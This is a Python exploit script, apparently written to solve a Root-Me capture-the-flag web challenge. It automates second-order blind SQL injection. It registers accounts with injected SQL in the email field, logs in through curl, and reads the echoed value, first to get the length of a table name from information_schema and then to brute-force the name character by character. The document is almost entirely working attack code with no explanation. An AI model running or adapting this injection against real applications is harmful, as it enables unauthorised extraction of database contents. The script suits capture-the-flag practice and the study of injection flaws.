#!/usr/bin/python

import os
import re
import sys

def urlencode(s):
	ignoreList = list('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_')
	acc = ''
	for c in s:
		if c in ignoreList:
			acc += c
		else:
			acc += '%' + hex(ord(c))[2:]
	return acc

class User:
	charList='abcdefghijkpqrstuvwxyz'
	def __init__(self, defaultName=''):
		if defaultName != '':
			self.name = defaultName
			self.currentChar = User.charList.index(self.name[-1])
		else:
			self.name = User.charList[0]
			self.currentChar = 0

	def __repr__(self):
		return (self.name)

	def __str__(self):
		return self.name

	def next(self):
		self.currentChar = (self.currentChar + 1)%len(User.charList)
		self.name = list(self.name)
		self.name[-1] = User.charList[self.currentChar]
		if self.name[-1] == User.charList[0]:
			i = 2
			while i <= len(self.name):
				self.name[-i] = User.charList[(User.charList.index(self.name[-i]) + 1) % len(User.charList)]
				i += 1
			if self.name[0] == User.charList[0]:
				self.name = [User.charList[0]] + self.name
		self.name = ''.join(self.name)

# Get length of table_name
print('Getting length of table_name')
email = urlencode("' + LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1)) + '")
user = User('gggw')
s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
print(user,s)
while 'user exist' in s.lower():
	user.next()
	print("user {0} exists".format(user))
	sys.stdout.flush()
	s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()

s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=login -d 'username={0}&password=a'".format(user)).read()
table_name_len = re.match('(.*\n)*.*Email : (\d+).*', s).group(2)
print('Table name length: {0}'.format(table_name_len))

# Get table_name
print('Getting table_name')
tryList = list('abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_')
i = 0
tableName = ''
while i < table_name_len:
	print(i, tableName)
	c = 32
	while c < 127:
		if chr(c) in "'\\":
			c += 1
			continue

		print("' or '{0}' < (SELECT table_name FROM information_schema.tables LIMIT 1) or '".format(tableName+chr(c)))
		email = urlencode("' or '{0}' < (SELECT table_name FROM information_schema.tables LIMIT 1) or '".format(tableName+chr(c)))
		user.next()
		s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
		while 'user exist' in s.lower():
			print("user {0} exists".format(user))
			user.next()
			sys.stdout.flush()
			s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
		s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=login -d 'username={0}&password=a'".format(user)).read()
		try:
			if s:
				result = re.match('(.*\n)*.*Email : (\d+).*', s).group(2)
			else:
				print("Empty result !")
				break
		except AttributeError:
			print('erreur:' + s)
			exit()
		if result == '1':
			c += 1
		elif result == '0':
			tableName += chr(c-1)
			break
	i += 1

print(user)
